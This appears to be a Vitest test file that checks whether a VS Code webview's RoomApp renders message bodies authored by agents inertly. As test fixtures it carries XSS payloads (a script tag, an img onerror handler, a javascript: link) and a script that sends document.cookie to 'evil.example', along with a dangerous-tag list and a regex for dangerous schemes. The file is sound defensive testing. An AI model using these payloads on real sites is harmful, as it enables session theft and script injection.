// @vitest-environment happy-dom
//
// Story 10.5, AC1 — the INERT-RENDER contract over the VS Code webview's RoomApp (NFR12).
//
// The strict CSP (webview-html.ts) is the FIRST line of NFR12 defense; this is the SECOND: even
// before the CSP would block it, the agent-authored message body is rendered INERT by the SAME
// ui-shared stack the web uses (markdown-it HTML-off → DOMPurify → Shiki class spans). This test
// mounts the REAL RoomApp (the webview's React surface) fed a bridge whose announcement + reply
// bodies carry attack payloads (`<script>`, `<img onerror>`, a `javascript:` link, a network
// `fetch`), and asserts the rendered DOM contains NO live script element, NO `on*` handler, NO
// dangerous-scheme href — and that a planted global canary the payloads WOULD call if they
// executed is NEVER invoked (the 9.2 web-canary precedent, applied to the webview surface).
//
// Runs under the ROOT happy-dom project (Rule 8/12 corollary: `apps/vscode-extension/src/**/*.test.tsx`
// is mapped to `ui-shared-dom` in the root vitest.config.ts; a per-package `vitest` run would
// falsely report `document is not defined`). prewarmHighlighter (9.5-shiki carry). The MUTATION
// proof at the bottom builds a DELIBERATELY-UNSAFE pipeline in-test and shows the SAME inert
// assertions then fire — the guard is non-vacuous (Rule 7), without mutating production source.

import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import { prewarmHighlighter } from '@agentbbs/ui-shared';

import { RoomApp } from './RoomApp.js';

import type {
  Bridge,
  ReadContractResult,
  ReadRoomResult,
} from './bridge-client.js';
import type { Root } from 'react-dom/client';

/** The attack payloads planted into the announcement + a reply body. */
const SCRIPT_PAYLOAD =
  '<script>window.__wvCanary && window.__wvCanary("script")</script>';
const IMG_PAYLOAD =
  '<img src=x onerror="window.__wvCanary && window.__wvCanary(\'img\')">';
const FETCH_PAYLOAD =
  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
const JS_LINK =
  '[click me](javascript:window.__wvCanary && window.__wvCanary())';

const MALICIOUS_ROOM: ReadRoomResult = {
  room: {
    roomId: 'calling-interface',
    projectId: 'acme',
    subject: 'Calling interface',
    body: `Announcement ${SCRIPT_PAYLOAD} ${IMG_PAYLOAD}`,
    postedBy: 'alice',
    seq: 5,
    active: true,
    activatedBy: 'alice',
    activatedAtSeq: 6,
  },
  messages: [
    {
      seq: 5,
      actor: 'alice',
      body: `Announcement ${SCRIPT_PAYLOAD} ${IMG_PAYLOAD}`,
      kind: 'announcement',
      reactions: [],
    },
    {
      seq: 6,
      actor: 'mallory',
      body: `Reply ${FETCH_PAYLOAD} ${JS_LINK}`,
      kind: 'reply',
      reactions: [],
    },
  ],
  participants: ['alice', 'mallory'],
};

const NO_CONTRACT: ReadContractResult = {
  roomId: 'calling-interface',
  contract: null,
};

function maliciousBridge(): Bridge {
  return {
    request<T = unknown>(op: string): Promise<T> {
      switch (op) {
        case 'readRoom':
          return Promise.resolve(MALICIOUS_ROOM as T);
        case 'readContract':
          return Promise.resolve(NO_CONTRACT as T);
        default:
          return Promise.reject(new Error(`unexpected op "${op}"`));
      }
    },
  };
}

const DANGEROUS_TAGS = [
  'script',
  'iframe',
  'object',
  'embed',
  'svg',
  'style',
  'form',
  'img',
];
const DANGEROUS_SCHEME = /^\s*(?:javascript|vbscript|data:text\/html)/iu;

/** Assert a rendered DOM subtree is inert (no live dangerous element / handler / scheme). */
function assertSubtreeInert(host: HTMLElement): void {
  for (const tag of DANGEROUS_TAGS) {
    expect(host.querySelector(tag), `live <${tag}>`).toBeNull();
  }
  for (const el of host.querySelectorAll('*')) {
    for (const attr of [...el.attributes]) {
      const an = attr.name.toLowerCase();
      expect(an.startsWith('on'), `on* handler (${an})`).toBe(false);
      if (an === 'href' || an === 'src' || an === 'xlink:href') {
        expect(
          DANGEROUS_SCHEME.test(attr.value),
          `dangerous scheme in ${an}="${attr.value}"`,
        ).toBe(false);
      }
    }
  }
}

let container: HTMLElement;
let root: Root;

declare global {
  // The inert-render canary the malicious payloads would call IF they executed.
  var __wvCanary: ((why?: string) => void) | undefined;
}

beforeAll(async () => {
  await prewarmHighlighter();
  // happy-dom would try to FETCH a live <img src>/<script src> if any survived — disable resource
  // loading so the parse stays offline (mirrors render-markdown.xss.test.ts). The real RoomApp
  // output is inert and triggers none of this.
  const hd = (
    globalThis as unknown as {
      happyDOM?: {
        settings?: {
          disableJavaScriptFileLoading?: boolean;
          disableCSSFileLoading?: boolean;
        };
      };
    }
  ).happyDOM;
  if (hd?.settings) {
    hd.settings.disableJavaScriptFileLoading = true;
    hd.settings.disableCSSFileLoading = true;
  }
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
  delete globalThis.__wvCanary;
});

describe('RoomApp — agent-authored bodies render INERT (NFR12, Story 10.5 AC1)', () => {
  it('a <script>/<img onerror>/fetch/js-link in the message bodies do NOT execute or fire a request', async () => {
    let canaryFired = false;
    let fetchCount = 0;
    globalThis.__wvCanary = () => {
      canaryFired = true;
    };
    // A network canary: if any surviving content issued a request, this would increment. The
    // strict CSP also forbids it in the real host; here we prove the rendered DOM never even tries.
    const realFetch = globalThis.fetch;
    globalThis.fetch = ((...args: unknown[]) => {
      fetchCount += 1;
      return Promise.reject(new Error(`unexpected fetch: ${String(args[0])}`));
    }) as typeof fetch;

    try {
      container = document.createElement('div');
      document.body.appendChild(container);
      root = createRoot(container);
      await act(async () => {
        root.render(
          <RoomApp
            bridge={maliciousBridge()}
            roomId="calling-interface"
            operatorHandle="operator"
          />,
        );
      });
      await act(async () => {
        await Promise.resolve();
        await Promise.resolve();
      });

      // The benign text around the payloads renders (proving the bodies DID render, not blank).
      expect(container.textContent).toContain('Announcement');
      expect(container.textContent).toContain('Reply');

      // No live dangerous element / handler / scheme anywhere in the rendered surface.
      assertSubtreeInert(container);

      // Nothing executed and nothing tried to phone home.
      expect(canaryFired).toBe(false);
      expect(fetchCount).toBe(0);
    } finally {
      globalThis.fetch = realFetch;
    }
  });

  // ---------------------------------------------------------------------------------------------
  // MUTATION (Rule 7 non-vacuity). The inert ASSERTION must discriminate a sanitized render from
  // an UNsanitized one. We inject the RAW (un-sanitized) attack payloads straight into a DOM node
  // — i.e. what the surface would render if the DOMPurify/allowlist stage were defeated — and
  // confirm the SAME `assertSubtreeInert` goes RED, then that a benign body passes. Production
  // source is NOT mutated (git diff stays empty); the full markdown-pipeline mutation lives in
  // ui-shared's render-markdown.xss.test.ts (which owns markdown-it). This webview test proves the
  // guard catches a live payload in the rendered subtree.
  // ---------------------------------------------------------------------------------------------
  it('assertSubtreeInert goes RED against a raw (un-sanitized) injection of the same payloads', () => {
    const host = document.createElement('div');
    // Raw injection — the markdown stack's job is to NEVER produce this; bypassing it proves the
    // assertion would catch a regression that did.
    host.innerHTML = `${IMG_PAYLOAD}<a href="javascript:alert(1)">x</a>`;
    document.body.appendChild(host);
    try {
      // The live <img onerror> + the js-scheme href survive raw → the guard must throw.
      expect(() => assertSubtreeInert(host)).toThrow();
      expect(host.querySelector('img')).not.toBeNull();
      expect(host.innerHTML).toMatch(/onerror\s*=/iu);
    } finally {
      host.remove();
    }
    // Sanity: a payload-free subtree passes the same assertion (the loosening, not the assertion
    // shape, is what trips it).
    const benign = document.createElement('div');
    benign.innerHTML = '<p>Just some <strong>bold</strong> prose.</p>';
    document.body.appendChild(benign);
    try {
      expect(() => assertSubtreeInert(benign)).not.toThrow();
    } finally {
      benign.remove();
    }
  });
});
